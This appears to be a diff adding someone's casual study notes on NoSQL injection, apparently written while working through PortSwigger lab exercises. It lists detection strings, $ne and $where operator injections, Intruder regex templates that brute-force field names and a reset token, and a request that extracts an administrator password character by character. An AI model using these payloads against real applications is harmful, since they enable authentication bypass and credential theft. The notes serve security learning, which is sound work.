@@ -1,0 +1,54 @@
+detecting NOSQLI: 
+'"`{
+;$Foo}
+$Foo \xYZ
+
+logic operators:
+' && 0 && 'x - false
+' && 1 && 'x - true
+
+look for change in logic or output
+
+'||1||' - this means always true 
+also nullbyte might work - try adding %00 to the and of query - this works like a comment in SQLI i guess xd
+
+try injecting stuff like:
+{"$ne":"invalid"}
+into fields like password etc.
+look for changes in responses which might give extra clues 
+
+Add "$where": "0" as an additional parameter in the JSON data as follows: {"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
+Send the request. Notice that you receive an Invalid username or password error message.
+Change "$where": "0" to "$where": "1", then resend the request. Notice that you receive an Account locked error message. This indicates that the JavaScript in the $where clause is being evaluated.
+
+this now would mean that $where is a valid clause and can be used to do logic stuff
+
+when the $where clause is evaluated, we can do something like SQLI logic extraction, 
+
+"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
+
+this has ready Intruder payloads, the first position specifies character name, the other the character value, so the first has 0-20, the other a-z, A-Z, 0-9, special chars
+this bruteforces the Key value, which works like a field (username/password fields are also Keys)
+so when we hit a valid character at a valid char position, we can get a field name which will prove useful in extracting its value 
+
+extracting the value goes like so:
+"$where":"this.resetToken.match('^.{§§}§§.*')"
+
+where resetToken is the name of the key, which values we are extracting
+then, again, we bruteforce the chars positions and values
+
+then use it like so:
+GET /reset-password?resetToken=token...
+
+
+Auth bypass:
+try regexing the admin username as it might have junk at the end 
+rest is as goes in portswigger docs
+
+PAYLOAD FOR extracting password one by one:
+GET /user/lookup?user=administrator'+%26%26+this.password+%26%26+this.password.match(/^cqshpwqf§§.*$/)%00 HTTP/2
+
+combine that with intruder
+
+reference:
+https://book.hacktricks.xyz/pentesting-web/nosql-injection
